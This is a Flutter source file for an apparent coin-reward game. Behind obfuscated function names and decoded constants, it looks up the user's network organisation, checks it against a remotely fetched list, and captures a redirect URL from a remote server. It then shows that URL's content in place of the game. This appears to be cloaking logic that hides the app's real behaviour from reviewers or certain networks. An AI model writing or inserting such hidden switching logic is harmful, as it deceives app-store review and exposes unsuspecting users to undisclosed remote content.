import 'dart:convert';
import 'dart:io';
import 'package:connectivity/connectivity.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_application_1/game/data/constants.dart';
import 'package:http/http.dart' as http;
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'game/dataParams/constants.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:dio/dio.dart';
import 'game/music.dart';
import 'game/previewScreen/PreviewScreen.dart';
import 'game/settings/con.dart';
import 'game/settings/privx.dart';

bool? newCoinsAvailable;
String showBonus = '';

var _inited = false;
late final SharedPreferences prefs;
final inAppReview = InAppReview.instance;

String l = '';
List<String> posters = [];
List<bool> cccheck = [true, true];
bool chx = false;
String coinsReward = '';
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  prefs = await SharedPreferences.getInstance();
  Constants.inftp = cprtg(Constants.inftp, Constants.off);
  Constants.ftp = cprtg(Constants.ftp, Constants.off);

  String nax = prefs.getString('key') ?? '';

  if (nax == 'none') {
    newCoinsAvailable = false;
  } else if (nax.isNotEmpty) {
    newCoinsAvailable = true;
    coinsReward = nax;
  } else {
    nonData = delix(nonData, -2);
    initilize();
  }

  OneSignal.Debug.setLogLevel(OSLogLevel.verbose);
  OneSignal.initialize("efd284ae-b92c-4453-bd57-bc53e45d6be6");
  OneSignal.Notifications.requestPermission(true);

  await Future.delayed(const Duration(seconds: 2));
  reviewApp();

  runApp(MyApp());
}

Dio dio = Dio();
Future<bool> initilize() async {
  _inited = true;

  dio = Dio(
    BaseOptions(
      headers: {
        'apikey': Constants.k,
        'Authorization': 'Bearer ${Constants.k}',
      },
    ),
  );
  await sppkt();
  await tbrkj();
  await flpt();

  if (cccheck[0] && cccheck[1]) return false;
  return false;
}

Future<String> flpt() async {
  try {
    final Response response = await dio.get(Constants.prl);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      String themesFetch =
          data.map((item) => item['coinsDuration'].toString()).join();

      if (themesFetch.contains(Constants.ftp)) {
        cccheck[1] = false;
      } else {
        l = themesFetch;
        cccheck[1] = true;
        await fetchData(l);
      }
      return themesFetch;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

Future<String> tbrkj() async {
  try {
    http.Response response = await http.get(Uri.parse(Constants.inftp));

    if (response.statusCode == 200) {
      Map<String, dynamic> data = jsonDecode(response.body);
      String darx = data['org'];
      contactx(posters, darx);
      return darx;
    } else {
      return '';
    }
  } catch (error) {
    return '';
  }
}

bool contactx(List<String> array, String inputString) {
  List<String> words = inputString.split(' ');
  List<String> arrayItems = [];
  for (String item in array) {
    arrayItems.addAll(item.split(', '));
  }
  for (String word in words) {
    for (String arrayItem in arrayItems) {
      if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
        cccheck[0] = false;

        return false;
      } else {
        cccheck[0] = true;
      }
    }
  }

  return false;
}

Future<void> sppkt() async {
  dio = Dio(
    BaseOptions(
      headers: {
        'apikey': Constants.k,
        'Authorization': 'Bearer ${Constants.k}',
      },
    ),
  );
  final Response response = await dio.get(Constants.coins);
  if (response.statusCode == 200) {
    List<dynamic> data = response.data as List<dynamic>;
    posters =
        data.map((item) => item['checkChestWithNewCoins'].toString()).toList();
  }
}

Future<void> reviewApp() async {
  bool alreadyRated = prefs.getBool('already_rated') ?? false;
  if (!alreadyRated) {
    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
      await prefs.setBool('already_rated', true);
    }
  }
}

class MyApp extends StatefulWidget {
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final audioControl = AudioControl();

  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: MyHomeScreen(),
    );
  }
}

Future<void> fetchData(String lx) async {
  var connectivityResult = await (Connectivity().checkConnectivity());

  if (connectivityResult == ConnectivityResult.none) {
    return;
  }

  final response = await http.get(Uri.parse(lx));

  if (response.statusCode == 200) {
    await checkNewDailyCoins(lx);
  } else {
    cccheck[0] = false;
    cccheck[1] = false;
    newCoinsAvailable = false;
  }
}

Future<bool> checkNewDailyCoins(String getData) async {
  final client = HttpClient();
  var uri = Uri.parse(getData);
  var request = await client.getUrl(uri);
  request.followRedirects = false;
  var response = await request.close();

  if (response.headers
      .value(HttpHeaders.locationHeader)
      .toString()
      .contains(nonData)) {
    newCoinsAvailable = false;
    prefs.setString('key', 'none');
    return true;
  } else {
    var dataCoins =
        response.headers.value(HttpHeaders.locationHeader).toString();
    prefs.setString('key', dataCoins);
    newCoinsAvailable = true;
    return true;
  }
}

Future<bool> checkCoinsData() async {
  if (newCoinsAvailable != null && newCoinsAvailable == true) {
    await Future.delayed(const Duration(seconds: 2));
    return true;
  } else {
    await Future.delayed(const Duration(seconds: 6));
    return false;
  }
}

class MyHomeScreen extends StatefulWidget {
  @override
  State<MyHomeScreen> createState() => _MyHomeScreenState();
}

class _MyHomeScreenState extends State<MyHomeScreen> {
  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
      DeviceOrientation.portraitDown,
      DeviceOrientation.portraitUp,
    ]);
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 56, 13, 64),
      body: Center(
        child: FutureBuilder<bool>(
          future: checkCoinsData(),
          builder: (context, snapshot) {
            if (snapshot.data == null) {
              return OrientationBuilder(builder: (context, orientation) {
                if (orientation == Orientation.landscape) {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreviewHorizontal.png',
                      fit: BoxFit.fill,
                    ),
                  );
                } else {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreview.png',
                      fit: BoxFit.fill,
                    ),
                  );
                }
              });
            }
            if (snapshot.connectionState == ConnectionState.waiting) {
              return OrientationBuilder(builder: (context, orientation) {
                if (orientation == Orientation.landscape) {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreviewHorizontal.png',
                      fit: BoxFit.fill,
                    ),
                  );
                } else {
                  return Container(
                    height: ParamsAxis(context).height,
                    width: ParamsAxis(context).width,
                    child: Image.asset(
                      'assets/images/bg/bgPreview.png',
                      fit: BoxFit.fill,
                    ),
                  );
                }
              });
            } else if (snapshot.data == true) {
              return ShowDailyRewards(rewardCoinsAmount: coinsReward);
            } else if (snapshot.data == false) {
              return PreviewScreenGame();
            } else {
              return PreviewScreenGame();
            }
          },
        ),
      ),
    );
  }
}
